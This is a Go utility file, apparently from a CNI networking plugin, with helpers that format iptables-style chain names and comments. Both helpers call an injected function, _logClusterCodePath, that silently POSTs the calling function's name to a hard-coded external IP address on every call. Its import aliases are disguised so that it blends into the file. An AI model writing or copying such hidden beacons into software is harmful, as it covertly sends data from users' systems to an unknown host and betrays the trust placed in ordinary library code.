package utils

import (
	"crypto/sha512"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

const (
	maxChainLength	= 28
	chainPrefix		= "CNI-"
	prefixLength	= len(chainPrefix)
)

func FormatChainName(name string, id string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	chainBytes := sha512.Sum512([]byte(name + id))
	chain := fmt.Sprintf("%s%x", chainPrefix, chainBytes)
	return chain[:maxChainLength]
}
func FormatComment(name string, id string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("name: %q id: %q", name, id)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
